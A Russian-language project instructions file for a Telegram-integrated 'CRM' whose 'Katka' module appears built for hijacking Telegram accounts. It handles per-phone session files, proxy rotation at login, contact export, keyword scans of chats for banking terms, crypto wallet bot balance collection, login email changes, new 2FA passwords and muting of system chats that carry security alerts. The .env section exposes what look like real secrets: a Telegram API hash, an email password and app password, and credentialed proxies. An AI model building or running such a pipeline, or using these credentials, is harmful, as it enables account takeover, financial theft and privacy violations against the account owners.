# LOCAL INSTRUCTIONS - CRM Telegram Integration

## Обзор проекта
Система CRM с интеграцией Telegram для работы с клиентскими сессиями через Telethon библиотеку.

---

## Архитектура

### Backend Stack
- **Node.js** + TypeScript
- **Express.js** для REST API
- **PostgreSQL** для данных
- **Python** + Telethon для работы с Telegram API
- **Docker** для контейнеризации

### Frontend Stack  
- **React** + TypeScript + Vite
- **Tailwind CSS** для стилизации
- **Axios** для HTTP запросов

---

## Развертывание и запуск

### Быстрый старт
```bash
# Клонирование и настройка
git clone <repo>
cd 12121

# Копирование конфигурации
cp .env.example .env
# Настроить переменные окружения в .env

# Запуск через Docker
docker compose up -d

# Проверка статуса
docker compose ps
```

### Локальная разработка
```bash
# Backend
cd backend
npm install
npm run dev

# Frontend  
cd frontend
npm install
npm run dev

# PostgreSQL
docker run --name postgres-crm -e POSTGRES_PASSWORD=password -p 5432:5432 -d postgres:16-alpine
```

---

## Переменные окружения (.env)

### Основные
```env
# Database
DATABASE_URL="postgresql://postgres:password@localhost:5432/crm_db"

# JWT
JWT_SECRET="your-jwt-secret-here"

# Telegram API
TELEGRAM_API_ID=33104909
TELEGRAM_API_HASH="788e3ff651cd500926b4be32d07daa45"

# Fallback Telegram credentials
TELEGRAM_API_ID_FALLBACK=12345678
TELEGRAM_API_HASH_FALLBACK="fallback_hash_here"

# Email for 2FA recovery
EMAIL_RECOVERY_ADDRESS="akulait19@gmail.com"
EMAIL_RECOVERY_PASSWORD="Qweras190!"
EMAIL_RECOVERY_APP_PASSWORD="wgwh tpf fzwg kvks"

# Proxy configuration
PROXY_LIST="109.248.142.177:5500:TV4GO0:1Z7dhD8iey,109.248.142.190:5500:TV4GO0:1Z7dhD8iey,109.248.142.208:5500:TV4GO0:1Z7dhD8iey,109.248.142.217:5500:TV4GO0:1Z7dhD8iey,109.248.142.221:5500:TV4GO0:1Z7dhD8iey,109.248.142.228:5500:TV4GO0:1Z7dhD8iey,109.248.142.250:5500:TV4GO0:1Z7dhD8iey,109.248.143.4:5500:TV4GO0:1Z7dhD8iey,109.248.143.26:5500:TV4GO0:1Z7dhD8iey,109.248.143.32:5500:TV4GO0:1Z7dhD8iey,109.248.143.34:5500:TV4GO0:1Z7dhD8iey,109.248.143.65:5500:TV4GO0:1Z7dhD8iey,109.248.143.72:5500:TV4GO0:1Z7dhD8iey,109.248.143.102:5500:TV4GO0:1Z7dhD8iey,109.248.143.112:5500:TV4GO0:1Z7dhD8iey,109.248.143.123:5500:TV4GO0:1Z7dhD8iey,109.248.143.129:5500:TV4GO0:1Z7dhD8iey,109.248.143.131:5500:TV4GO0:1Z7dhD8iey,109.248.143.141:5500:TV4GO0:1Z7dhD8iey,109.248.143.147:5500:TV4GO0:1Z7dhD8iey,109.248.143.160:5500:TV4GO0:1Z7dhD8iey,109.248.143.163:5500:TV4GO0:1Z7dhD8iey,109.248.143.169:5500:TV4GO0:1Z7dhD8iey,109.248.143.170:5500:TV4GO0:1Z7dhD8iey,109.248.143.180:5500:TV4GO0:1Z7dhD8iey,109.248.143.190:5500:TV4GO0:1Z7dhD8iey,109.248.143.201:5500:TV4GO0:1Z7dhD8iey,109.248.143.225:5500:TV4GO0:1Z7dhD8iey,109.248.143.238:5500:TV4GO0:1Z7dhD8iey,109.248.143.250:5500:TV4GO0:1Z7dhD8iey,109.248.143.252:5500:TV4GO0:1Z7dhD8iey,188.130.136.3:5500:TV4GO0:1Z7dhD8iey,188.130.136.23:5500:TV4GO0:1Z7dhD8iey,188.130.136.25:5500:TV4GO0:1Z7dhD8iey,188.130.136.37:5500:TV4GO0:1Z7dhD8iey,188.130.136.38:5500:TV4GO0:1Z7dhD8iey,188.130.136.47:5500:TV4GO0:1Z7dhD8iey,188.130.136.54:5500:TV4GO0:1Z7dhD8iey,188.130.136.74:5500:TV4GO0:1Z7dhD8iey,188.130.136.76:5500:TV4GO0:1Z7dhD8iey,188.130.136.78:5500:TV4GO0:1Z7dhD8iey,188.130.136.81:5500:TV4GO0:1Z7dhD8iey,188.130.136.84:5500:TV4GO0:1Z7dhD8iey,188.130.136.87:5500:TV4GO0:1Z7dhD8iey,188.130.136.91:5500:TV4GO0:1Z7dhD8iey,188.130.136.98:5500:TV4GO0:1Z7dhD8iey,188.130.136.107:5500:TV4GO0:1Z7dhD8iey,188.130.136.152:5500:TV4GO0:1Z7dhD8iey,188.130.136.155:5500:TV4GO0:1Z7dhD8iey,188.130.136.162:5500:TV4GO0:1Z7dhD8iey,188.130.136.163:5500:TV4GO0:1Z7dhD8iey,188.130.136.205:5500:TV4GO0:1Z7dhD8iey,188.130.136.226:5500:TV4GO0:1Z7dhD8iey,188.130.136.249:5500:TV4GO0:1Z7dhD8iey,188.130.137.6:5500:TV4GO0:1Z7dhD8iey,109.248.139.81:5500:TV4GO0:1Z7dhD8iey,46.8.192.135:5500:TV4GO0:1Z7dhD8iey,109.248.138.173:5500:TV4GO0:1Z7dhD8iey,109.248.138.231:5500:TV4GO0:1Z7dhD8iey,109.248.139.13:5500:TV4GO0:1Z7dhD8iey,109.248.139.87:5500:TV4GO0:1Z7dhD8iey,109.248.139.122:5500:TV4GO0:1Z7dhD8iey,109.248.139.197:5500:TV4GO0:1Z7dhD8iey,109.248.139.207:5500:TV4GO0:1Z7dhD8iey,109.248.139.216:5500:TV4GO0:1Z7dhD8iey,109.248.139.231:5500:TV4GO0:1Z7dhD8iey,109.248.139.251:5500:TV4GO0:1Z7dhD8iey,46.8.192.18:5500:TV4GO0:1Z7dhD8iey,46.8.192.57:5500:TV4GO0:1Z7dhD8iey,46.8.192.64:5500:TV4GO0:1Z7dhD8iey,46.8.192.74:5500:TV4GO0:1Z7dhD8iey,46.8.192.135:5500:TV4GO0:1Z7dhD8iey,46.8.192.169:5500:TV4GO0:1Z7dhD8iey,46.8.192.173:5500:TV4GO0:1Z7dhD8iey,46.8.192.219:5500:TV4GO0:1Z7dhD8iey,46.8.192.228:5500:TV4GO0:1Z7dhD8iey,46.8.193.13:5500:TV4GO0:1Z7dhD8iey,46.8.193.19:5500:TV4GO0:1Z7dhD8iey,46.8.193.35:5500:TV4GO0:1Z7dhD8iey,46.8.193.66:5500:TV4GO0:1Z7dhD8iey,46.8.193.144:5500:TV4GO0:1Z7dhD8iey,46.8.193.212:5500:TV4GO0:1Z7dhD8iey,188.130.188.12:5500:TV4GO0:1Z7dhD8iey"

# Email list for login email changes
EMAIL_LIST="email1@domain.com,email2@domain.com,email3@domain.com"

# 2FA Password
NEW_2FA_PASSWORD="SecurePassword123!"

# Search patterns for content analysis
SEARCH_PATTERNS="банк,кредит,деньги,займ,процент,вклад,карта,платеж"

# Crypto wallet bots
CRYPTO_WALLET_BOTS="@wallet,@CryptoBot,@BitcoinWalletBot,@TrustWalletBot"
```

---

## Telegram Integration

### Основные функции Katka модуля
1. **Авторизация с прокси** - Ротация прокси при авторизации
2. **Экспорт контактов** - С фото и без фото
3. **Анализ паттернов** - Поиск по ключевым словам
4. **Управление уведомлениями** - Отключение системных чатов
5. **Баланс криптокошельков** - Сбор информации с ботов
6. **Смена login email** - Автоматическая смена через почту
7. **Аватары профилей** - Загрузка и кэширование
8. **Автоматический пайплайн** - Последовательность действий после авторизации

### Структура файлов сессий
```
telegram-sessions/
└── +79999999999/
    ├── session.session          # Telethon сессия
    ├── exports/
    │   ├── contacts_YYYYMMDD_HHMMSS.csv
    │   ├── chats_YYYYMMDD_HHMMSS.json
    │   ├── patterns_YYYYMMDD_HHMMSS.json
    │   ├── balance_YYYYMMDD_HHMMSS.json
    │   ├── saved_messages_YYYYMMDD_HHMMSS/
    │   └── avatar_YYYYMMDD_HHMMSS.jpg
    ├── contact_photos/
    │   └── user_id_xxxxx.jpg
    └── logs/
        └── session.log
```

---

## Development Workflow

### Добавление новой функции
1. **Backend**: Создать endpoint в `backend/src/telegram/`
2. **Python script**: Добавить в `backend/src/telegram/scripts/`
3. **Frontend**: Добавить в `frontend/src/services/telegramService.ts`
4. **UI**: Обновить `frontend/src/pages/Katka.tsx`

### Тестирование
```bash
# Backend тесты
cd backend && npm test

# Frontend тесты  
cd frontend && npm test

# E2E тестирование
npm run test:e2e
```

### Логирование
- **Backend**: Winston logger в `backend/src/utils/logger.ts`
- **Python**: Стандартный logging модуль
- **Frontend**: Console + toast notifications

---

## Production Deployment

### Docker Production
```bash
# Production build
docker compose -f docker-compose.prod.yml up -d

# Backup database
docker exec postgres-container pg_dump -U postgres crm_db > backup.sql

# Update application
docker compose pull
docker compose up -d --force-recreate
```

### Monitoring
- Проверка логов: `docker compose logs -f backend`
- Статус контейнеров: `docker compose ps`
- Мониторинг ресурсов: `docker stats`

---

## Troubleshooting

### Частые проблемы

#### Telegram авторизация не работает
1. Проверить TELEGRAM_API_ID и TELEGRAM_API_HASH
2. Проверить доступность прокси
3. Проверить лимиты Telegram API

#### Прокси не подключается
1. Проверить формат в PROXY_LIST (ip:port:user:pass)
2. Проверить доступность прокси извне
3. Использовать fallback конфигурацию

#### База данных недоступна  
1. Проверить DATABASE_URL
2. Проверить статус PostgreSQL контейнера
3. Проверить migrations: `npm run db:migrate`

### Логи и отладка
```bash
# Backend логи
docker compose logs backend

# Frontend dev server
cd frontend && npm run dev

# Python Telegram scripts
python3 backend/src/telegram/scripts/debug_script.py

# Database подключение
docker exec -it postgres-container psql -U postgres crm_db
```

---

## Security Guidelines

### Переменные окружения
- Никогда не коммитить .env файлы
- Использовать strong passwords для JWT_SECRET
- Ротация API ключей каждые 90 дней

### Telegram безопасность  
- Использовать только официальные Telegram API
- Обработка FloodWait ошибок
- Ограничение частоты запросов

### Docker безопасность
- Использовать non-root пользователей
- Минимальные образы (alpine)
- Регулярные обновления base images

---

## API Documentation

### Telegram Endpoints
- `POST /api/telegram/send-code` - Отправка кода авторизации
- `POST /api/telegram/verify-code` - Проверка кода
- `GET /api/telegram/sessions` - Список сессий
- `POST /api/telegram/katka/export-contacts` - Экспорт контактов
- `POST /api/telegram/katka/patterns` - Анализ паттернов
- `POST /api/telegram/katka/balance` - Баланс кошельков

### Response Format
```json
{
  "success": true|false,
  "data": {},
  "message": "описание",
  "error": "детали ошибки"
}
```

---

## Roadmap & TODOs

### Краткосрочные задачи
- [ ] Улучшение обработки ошибок Telethon
- [ ] Оптимизация экспорта больших данных
- [ ] Добавление прогресс-индикаторов
- [ ] Кэширование аватаров контактов

### Долгосрочные задачи  
- [ ] Микросервисная архитектура
- [ ] Kubernetes deployment
- [ ] Мониторинг и алертинг
- [ ] Автоматическое резервное копирование

---

Дата создания: 14 ноября 2025
Версия: 1.0.0